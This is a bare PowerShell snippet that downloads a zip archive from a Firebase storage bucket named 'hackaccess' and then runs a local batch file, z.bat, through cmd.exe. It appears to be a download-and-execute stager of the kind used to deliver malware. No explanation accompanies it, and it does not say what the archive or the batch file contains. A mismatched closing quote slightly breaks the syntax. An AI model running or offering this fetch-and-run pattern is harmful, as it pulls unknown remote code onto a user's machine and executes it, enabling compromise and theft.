$client = new-object System.Net.WebClient
$client.DownloadFile("https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.zip?alt=media&token=baafa4ad-0276-466e-88d3-5757503cedf4", ".\abc.zip”) 

cmd.exe /c .\z.bat